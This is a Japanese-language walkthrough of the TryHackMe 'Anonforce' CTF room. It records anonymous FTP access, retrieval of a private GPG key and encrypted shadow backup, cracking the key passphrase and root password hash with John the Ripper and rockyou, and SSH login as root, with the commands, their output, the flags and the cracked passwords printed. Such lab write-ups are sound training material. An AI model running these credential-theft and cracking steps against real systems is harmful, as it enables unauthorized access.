# Anonforce CTF

https://tryhackme.com/r/room/bsidesgtanonforce

## ポートスキャン

FTP と SSH ポートのみ。

```shell
sudo nmap $TARGET
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-11 21:02 EST
Nmap scan report for 10.10.209.48
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 5.11 seconds
```

## FTP

anonymous で入れる

```shell
$ tnftp $TARGET
Connected to 10.10.209.48.
220 (vsFTPd 3.0.3)
Name (10.10.209.48:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp>
```

```shell
ftp> ls
229 Entering Extended Passive Mode (|||10014|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
drwxr-xr-x   17 0        0            3700 Dec 11 17:45 dev
drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
drwx------    2 0        0           16384 Aug 11  2019 lost+found
drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
dr-xr-xr-x   92 0        0               0 Dec 11 17:45 proc
drwx------    3 0        0            4096 Aug 11  2019 root
drwxr-xr-x   18 0        0             540 Dec 11 17:45 run
drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
dr-xr-xr-x   13 0        0               0 Dec 11 17:45 sys
drwxrwxrwt    9 0        0            4096 Dec 11 18:02 tmp
drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
```

```shell
ftp> ls notread
229 Entering Extended Passive Mode (|||19975|)
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
226 Directory send OK.

ftp> cd notread
250 Directory successfully changed.

ftp> recv backup.pgp
local: backup.pgp remote: backup.pgp
229 Entering Extended Passive Mode (|||27007|)
150 Opening BINARY mode data connection for backup.pgp (524 bytes).
100% |**********************************************************************************************************************************************************************************************|   524       54.23 KiB/s    00:00 ETA
226 Transfer complete.
524 bytes received in 00:00 (1.81 KiB/s)

ftp> recv private.asc
local: private.asc remote: private.asc
229 Entering Extended Passive Mode (|||23213|)
150 Opening BINARY mode data connection for private.asc (3762 bytes).
100% |**********************************************************************************************************************************************************************************************|  3762      208.98 KiB/s    00:00 ETA
226 Transfer complete.
3762 bytes received in 00:00 (12.76 KiB/s)
```

```shell
ftp> cd home
250 Directory successfully changed.

ftp> cd melodias
250 Directory successfully changed.

ftp> ls
229 Entering Extended Passive Mode (|||15178|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
226 Directory send OK.

ftp> recv user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||59251|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |**********************************************************************************************************************************************************************************************|    33        8.20 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.11 KiB/s)
```

フラグ１ゲット

```shell
$ cat ./user.txt
606083fd33beb1284fc51f411a706af8
```

```shell
$ cat ./passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
melodias:x:1000:1000:anonforce,,,:/home/melodias:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:109:117:ftp daemon,,,:/srv/ftp:/bin/false
```

## GPG

### プライベートキーファイルからパスワードをクラック

```shell
$ gpg2john ./private.asc > hash
File ./private.asc

$ cat hash
anonforce:$gpg$*17*54*2048*e419ac715ed55197122fd0acc6477832266db83b63a3f0d16b7f5fb3db2b93a6a995013bb1e7aff697e782d505891ee260e957136577*3*254*2*9*16*5d044d82578ecc62baaa15c1bcf1cfdd*65536*d7d11d9bf6d08968:::anonforce <melodias@anonforce.nsa>::./private.asc

$ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xbox360          (anonforce)
1g 0:00:00:00 DONE (2024-12-11 21:34) 7.692g/s 7153p/s 7153c/s 7153C/s lolipop..sheena
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```shell
$ john -show ./hash
anonforce:xbox360:::anonforce <melodias@anonforce.nsa>::./private.asc

1 password hash cracked, 0 left
```

ユーザーとパスワードは下記の部分

```text
user: anonforce
password: xbox360
```

### プライベートキーのインポート

次の操作でパスワードを聞かれる

```shell
$ gpg --import ./private.asc
gpg: key B92CD1F280AD82C2: public key "anonforce <melodias@anonforce.nsa>" imported
gpg: key B92CD1F280AD82C2: secret key imported
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

### 暗号ファイルを復号化

Shadow ファイルが出てきた

```shell
$ gpg --decrypt ./backup.pgp
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::
```

（メモ）インポートした GPG キーの削除方法

```shell
gpg --list-keys
gpg --delete-secret-keys <ID>
gpg --delete-keys <ID>
```

## Shadow ファイルクラック

root は SHA-512, melodias は MD5 なので、melodias のクラックを目指す。  
john＆rockyou.txt ではクラックできなかった

```shell
$ sudo cat passwd | grep melodias > passwd.txt
sudo cat shadow | grep melodias > shadow.txt
unshadow passwd.txt shadow.txt > unshadow.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt
john --show unshadow.txt
[sudo] password for kali:
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:40 DONE (2024-12-12 00:01) 0g/s 350224p/s 350224c/s 350224C/s  ejngyhga007..*7¡Vamos!
Session completed.
0 password hashes cracked, 1 left
```

ルールファイル付きで hashcat を試す。成功する気がしないので中断。

```shell
$ hashcat -m 500 --rules-file /usr/share/hashcat/rules/best64.rule ./hash /usr/share/wordlists/rockyou.txt
```

単純に shadow に対して john をかけたら root のパスワードが割れた。なんでやねん。

```shell
$ john --wordlist=/usr/share/wordlists/rockyou.txt ./shadow

Warning: only loading hashes of type "sha512crypt", but also saw type "md5crypt"
Use the "--format=md5crypt" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hikari           (root)
1g 0:00:00:01 DONE (2024-12-12 01:01) 0.5747g/s 3972p/s 3972c/s 3972C/s oblivion..better
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

root / hikari

## SSH

```shell
root@ubuntu:~# ls -al /root
total 28
drwx------  4 root root 4096 Dec 11 22:04 .
drwxr-xr-x 23 root root 4096 Aug 11  2019 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Dec 11 22:04 .cache
drwxr-xr-x  2 root root 4096 Aug 11  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Aug 11  2019 root.txt
root@ubuntu:~# cat /root/root.txt
f706456440c7af4187810c31c6cebdce
```

root フラグゲット！

## 振り返り

- shadow からユーザー名で Grep かけるような余計な事せずに、シンプルにファイル全体を処理すればよかった
- unshadow って実はあまり意味ない？
- 一般ユーザーで SSH に入って特権昇格を目指すのかと思ってたら拍子抜け
- 普段触らない FTP と GPG をハンズオンできたのは良かった
